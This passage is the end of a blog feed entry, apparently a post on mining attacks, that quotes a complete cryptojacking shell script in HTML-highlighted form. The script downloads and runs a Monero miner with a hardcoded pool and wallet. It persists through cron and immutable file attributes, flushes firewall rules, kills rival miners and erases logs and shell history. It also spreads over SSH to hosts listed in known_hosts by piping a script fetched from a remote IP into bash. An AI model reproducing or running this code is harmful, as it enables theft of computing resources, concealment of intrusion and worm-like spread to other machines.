class="keyword">then</span></span><br><span class="line">            filesize1=`ls -l /etc/zzh | awk <span class="string">&#x27;&#123; print $5 &#125;&#x27;</span>`</span><br><span class="line">            <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$filesize1</span>&quot;</span> -ne <span class="string">&quot;<span class="variable">$miner_size</span>&quot;</span> ] </span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                pkill -f zzh</span><br><span class="line">                rm /etc/zzh</span><br><span class="line">                downloads <span class="variable">$miner_url</span> /etc/zzh <span class="variable">$miner_url_backup</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;not need download&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">            downloads <span class="variable">$miner_url</span> /etc/zzh <span class="variable">$miner_url_backup</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    downloads <span class="variable">$sh_url</span> /etc/newinit.sh <span class="variable">$sh_url_backup</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    chmod 777 /etc/zzh</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/ps.original&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        ps.original -fe|grep zzh |grep -v grep</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ps -fe|grep zzh |grep -v grep</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">cd</span> /etc</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;not root runing&quot;</span></span><br><span class="line">                sleep 5s</span><br><span class="line">                cpunum=`cat /proc/cpuinfo |grep -i model|grep name|wc -l`</span><br><span class="line"><span class="keyword">if</span>  ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=2 )); <span class="keyword">then</span></span><br><span class="line">      cpunum=1</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=4)); <span class="keyword">then</span></span><br><span class="line">      cpunum=2</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=8)); <span class="keyword">then</span></span><br><span class="line">      cpunum=4</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=16)); <span class="keyword">then</span></span><br><span class="line">      cpunum=8</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=32)); <span class="keyword">then</span></span><br><span class="line">      cpunum=16</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=64)); <span class="keyword">then</span></span><br><span class="line">      cpunum=32</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&gt;64)); <span class="keyword">then</span></span><br><span class="line">      cpunum=50</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">      cpunum=1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">                ./zzh -B --log-file=/etc/etc --coin=monero -o stratum+tcp://xmr-asia1.nanopool.org:14444 --threads=<span class="variable">$cpunum</span> -u 43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz.3910 -p x &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;root runing.....&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    chmod 777 /etc/zzh</span><br><span class="line">    chattr +ia /etc/zzh</span><br><span class="line">    chmod 777 /etc/newinit.sh</span><br><span class="line">    chattr +ia /etc/newinit.sh</span><br><span class="line">    chmod 600 /root/.ssh/authorized_keys</span><br><span class="line">    chattr +ia /root/.ssh/authorized_keys</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;goto 1&quot;</span> &gt; /tmp/zzhs</span><br><span class="line">    chattr -ia /tmp/zzh*</span><br><span class="line">    chattr -ia /tmp/newinit.sh*</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> [ ! -f <span class="string">&quot;/usr/bin/crontab&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                        unlock_cron</span><br><span class="line">                        <span class="built_in">echo</span> <span class="string">&quot;*/30 * * * * sh /tmp/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; <span class="variable">$&#123;crondir&#125;</span></span><br><span class="line">                        lock_cron</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                        unlock_cron</span><br><span class="line">                        [[ <span class="variable">$cont</span> =~ <span class="string">&quot;newinit.sh&quot;</span> ]] || (crontab -l ; <span class="built_in">echo</span> <span class="string">&quot;*/30 * * * * sh /tmp/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span>) | crontab -</span><br><span class="line">                        lock_cron</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/tmp/zzh&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span>    </span><br><span class="line">        filesize1=`ls -l /tmp/zzh | awk <span class="string">&#x27;&#123; print $5 &#125;&#x27;</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$filesize1</span>&quot;</span> -ne <span class="string">&quot;<span class="variable">$miner_size</span>&quot;</span> ] </span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                pkill -f zzh</span><br><span class="line">                rm /tmp/zzh</span><br><span class="line">                downloads <span class="variable">$miner_url</span> /tmp/zzh <span class="variable">$miner_url_backup</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;no need download&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">            downloads <span class="variable">$miner_url</span> /tmp/zzh <span class="variable">$miner_url_backup</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;i am here&quot;</span></span><br><span class="line">    downloads <span class="variable">$sh_url</span> /tmp/newinit.sh <span class="variable">$sh_url_backup</span></span><br><span class="line"></span><br><span class="line">    ps -fe|grep zzh |grep -v grep</span><br><span class="line">        <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;not tmp runing&quot;</span></span><br><span class="line">                <span class="built_in">cd</span> /tmp</span><br><span class="line">                chmod 777 zzh</span><br><span class="line">                sleep 5s</span><br><span class="line">                cpunum=`cat /proc/cpuinfo |grep -i model|grep name|wc -l`</span><br><span class="line"><span class="keyword">if</span>  ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=2 )); <span class="keyword">then</span></span><br><span class="line">      cpunum=1</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=4)); <span class="keyword">then</span></span><br><span class="line">      cpunum=2</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=8)); <span class="keyword">then</span></span><br><span class="line">      cpunum=4</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=16)); <span class="keyword">then</span></span><br><span class="line">      cpunum=8</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=32)); <span class="keyword">then</span></span><br><span class="line">      cpunum=16</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&lt;=64)); <span class="keyword">then</span></span><br><span class="line">      cpunum=32</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">elif</span> ((<span class="string">&quot;<span class="variable">$cpunum</span>&quot;</span>&gt;64)); <span class="keyword">then</span></span><br><span class="line">      cpunum=50</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$cpunum</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">      <span class="built_in">echo</span> other   </span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">                ./zzh -B --log-file=/etc/etc --coin=monero -o stratum+tcp://xmr-asia1.nanopool.org:14444 --threads=<span class="variable">$cpunum</span> -u 43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz.3910 -p x &amp;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;tmp runing.....&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    chmod 777 /tmp/zzh</span><br><span class="line">    chattr +i /tmp/zzh</span><br><span class="line">    chmod 777 /tmp/newinit.sh</span><br><span class="line">    chattr +i /tmp/newinit.sh</span><br><span class="line">        </span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 5555 -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 7777 -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 9999 -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 9999 -j DROP</span><br><span class="line">service iptables reload</span><br><span class="line">ps auxf|grep -v grep|grep -v 43Xbgtym2GZWBk87XiYbCpTKGPBTxY|grep <span class="string">&quot;stratum&quot;</span>|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line"><span class="built_in">history</span> -c</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/spool/mail/root</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/<span class="built_in">log</span>/wtmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/<span class="built_in">log</span>/secure</span><br><span class="line"><span class="built_in">echo</span> &gt; /root/.bash_history</span><br><span class="line"></span><br><span class="line">yum install -y bash 2&gt;/dev/null</span><br><span class="line">apt install -y bash 2&gt;/dev/null</span><br><span class="line">apt-get install -y bash 2&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> $(grep -oE <span class="string">&quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot;</span> /root/.ssh/known_hosts); <span class="keyword">do</span> ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no <span class="variable">$h</span> <span class="string">&#x27;curl -o-  http://106.15.74.113/b2f628fff19fda999999999/is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&#x27;</span> &amp; <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> $(grep -oE <span class="string">&quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot;</span> /root/.ssh/known_hosts); <span class="keyword">do</span> ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no <span class="variable">$h</span> <span class="string">&#x27;cd1 -o-  http://106.15.74.113/b2f628fff19fda999999999/is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&#x27;</span> &amp; <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$bbdir</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$bbdira</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$bbdir</span> -fsSL http://106.15.74.113/b2f628fff19fda999999999/is.sh | bash</span><br><span class="line"><span class="variable">$bbdira</span> -fsSL http://106.15.74.113/b2f628fff19fda999999999/is.sh | bash</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>æŒ–çŸ¿æ”»å‡»</tag>
      </tags>
  </entry>
</search>
